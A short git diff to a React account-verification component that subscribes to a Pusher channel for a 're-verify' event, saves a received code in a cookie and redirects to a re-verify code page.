@@ -9,6 +9,8 @@ function AccountVerify() {
   const router = useRouter();
 
   const [verifyId, setVerifyId] = useState("");
+  const[reverifyId, setReVerifyId] = useState('');
+  
   const id = Cookies.get("id");
   const pusher = new Pusher("05656b52c62c0f688ee3", {
     // APP_KEY
@@ -33,8 +35,26 @@ function AccountVerify() {
     };
   }, [id]);
 
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+    channel.bind('code-re-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("code", data.code);
+      setReVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-re-verify');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
   if (verifyId) {
-    return router.push("/accountrecovery");
+    return router.push("/account-verify-code");
+  }
+  if(reverifyId){
+    return router.push("/account-reverify-code");
   }
   return <VerifyingState />;
 }
